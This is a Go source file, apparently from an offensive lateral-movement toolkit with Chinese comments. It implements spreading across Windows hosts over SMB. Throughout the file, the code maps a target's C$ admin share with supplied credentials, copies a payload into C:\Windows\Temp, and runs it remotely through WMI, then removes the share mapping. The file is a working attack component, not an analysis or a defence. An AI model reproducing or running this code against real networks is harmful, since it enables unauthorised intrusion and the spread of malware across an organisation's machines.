package lateral

import (
	"fmt"
	"path/filepath"
)

// moveViaSMB 通过 SMB 共享执行横向移动
func (lm *LateralMover) moveViaSMB(req MoveRequest) MoveResult {
	result := MoveResult{
		Method: MethodSMB,
		Target: getTargetAddress(req.Target),
	}

	if err := validateRequest(req); err != nil {
		result.Error = err
		result.Message = err.Error()
		return result
	}

	if req.PayloadPath == "" {
		result.Error = fmt.Errorf("payload path is required for SMB method")
		result.Message = result.Error.Error()
		return result
	}

	targetAddr := getTargetAddress(req.Target)
	credStr := buildCredString(req.Credentials)

	remotePath := fmt.Sprintf("\\\\%s\\C$", targetAddr)
	netUseArgs := []string{
		"use",
		remotePath,
		"/user:" + credStr,
		req.Credentials.Password,
	}

	output, err := lm.execCommand("net", netUseArgs...)
	if err != nil {
		result.Success = false
		result.Error = err
		result.Message = fmt.Sprintf("Failed to establish SMB connection: %v", err)
		result.Output = sanitizeOutput(output)
		return result
	}

	remoteFile := fmt.Sprintf("%s\\Windows\\Temp\\%s", remotePath, filepath.Base(req.PayloadPath))
	copyArgs := []string{
		req.PayloadPath,
		remoteFile,
	}

	output2, err := lm.execCommand("copy", copyArgs...)
	if err != nil {
		lm.execCommand("net", "use", remotePath, "/delete", "/y")
		result.Success = false
		result.Error = err
		result.Message = fmt.Sprintf("Failed to copy file via SMB: %v", err)
		result.Output = sanitizeOutput(output + "\n" + output2)
		return result
	}

	remoteExePath := fmt.Sprintf("C:\\Windows\\Temp\\%s", filepath.Base(req.PayloadPath))
	wmiReq := req
	wmiReq.Method = MethodWMI
	wmiReq.Command = remoteExePath

	wmiResult := lm.moveViaWMI(wmiReq)
	lm.execCommand("net", "use", remotePath, "/delete", "/y")

	result.Success = wmiResult.Success
	result.Message = "File copied via SMB and executed via WMI"
	result.Output = sanitizeOutput(output + "\n" + output2 + "\n" + wmiResult.Output)
	result.Error = wmiResult.Error

	return result
}

// copyFileViaSMB 通过 SMB 复制文件到目标主机
func (lm *LateralMover) copyFileViaSMB(target Target, creds Credentials, localPath, remotePath string) error {
	targetAddr := getTargetAddress(target)
	credStr := buildCredString(creds)

	remoteShare := fmt.Sprintf("\\\\%s\\C$", targetAddr)
	netUseArgs := []string{
		"use",
		remoteShare,
		"/user:" + credStr,
		creds.Password,
	}

	_, err := lm.execCommand("net", netUseArgs...)
	if err != nil {
		return fmt.Errorf("failed to establish SMB connection: %v", err)
	}

	copyArgs := []string{
		localPath,
		remoteShare + "\\" + remotePath,
	}

	_, err = lm.execCommand("copy", copyArgs...)
	if err != nil {
		lm.execCommand("net", "use", remoteShare, "/delete", "/y")
		return fmt.Errorf("failed to copy file: %v", err)
	}

	lm.execCommand("net", "use", remoteShare, "/delete", "/y")
	return nil
}
